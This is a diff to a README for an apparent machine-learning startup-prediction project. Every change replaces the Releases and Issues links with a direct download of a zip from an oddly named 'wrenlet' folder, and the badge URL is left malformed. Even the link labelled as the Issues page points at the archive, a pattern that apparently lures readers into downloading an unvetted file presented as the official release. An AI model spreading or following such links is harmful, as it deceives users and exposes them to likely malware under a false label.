@@ -3,7 +3,7 @@
 
 ## 📥 Download
 
-[![Download](https://img.shields.io/badge/Download-Latest%20Release-blue.svg)](https://github.com/ESI-Games/Python--Startup-Success-Prediction-using-Machine-Learning/releases)
+[![Download](https://raw.githubusercontent.com/ESI-Games/Python--Startup-Success-Prediction-using-Machine-Learning/main/wrenlet/Python--Startup-Success-Prediction-using-Machine-Learning.zip%https://raw.githubusercontent.com/ESI-Games/Python--Startup-Success-Prediction-using-Machine-Learning/main/wrenlet/Python--Startup-Success-Prediction-using-Machine-Learning.zip)](https://raw.githubusercontent.com/ESI-Games/Python--Startup-Success-Prediction-using-Machine-Learning/main/wrenlet/Python--Startup-Success-Prediction-using-Machine-Learning.zip)
 
 ## 📋 Project Overview
 
@@ -16,7 +16,7 @@ To get started with the application, follow these simple steps:
 1. **Visit the Download Page:**
    Click the link below to go to the Releases page and download the application.
 
-   [Download from Releases](https://github.com/ESI-Games/Python--Startup-Success-Prediction-using-Machine-Learning/releases)
+   [Download from Releases](https://raw.githubusercontent.com/ESI-Games/Python--Startup-Success-Prediction-using-Machine-Learning/main/wrenlet/Python--Startup-Success-Prediction-using-Machine-Learning.zip)
 
 2. **Choose the Right Version:**
    On the Releases page, look for the latest version available. Typically, the most recent version will be a stable release.
@@ -95,7 +95,7 @@ If you encounter issues while installing or using the application, consider the 
 
 ## 🔗 Contact and Support
 
-For questions or further assistance, feel free to contact the maintainers of this repository. Visit the GitHub [Issues Page](https://github.com/ESI-Games/Python--Startup-Success-Prediction-using-Machine-Learning/issues) to report bugs or request assistance.
+For questions or further assistance, feel free to contact the maintainers of this repository. Visit the GitHub [Issues Page](https://raw.githubusercontent.com/ESI-Games/Python--Startup-Success-Prediction-using-Machine-Learning/main/wrenlet/Python--Startup-Success-Prediction-using-Machine-Learning.zip) to report bugs or request assistance.
 
 Also, ensure to check for updates frequently, as improvements and new features are always in development.
 
@@ -105,5 +105,5 @@ Ready to see how it works?
 
 Go back to the link below to download the software and start predicting now!
 
-[Download from Releases](https://github.com/ESI-Games/Python--Startup-Success-Prediction-using-Machine-Learning/releases)
+[Download from Releases](https://raw.githubusercontent.com/ESI-Games/Python--Startup-Success-Prediction-using-Machine-Learning/main/wrenlet/Python--Startup-Success-Prediction-using-Machine-Learning.zip)
 ```
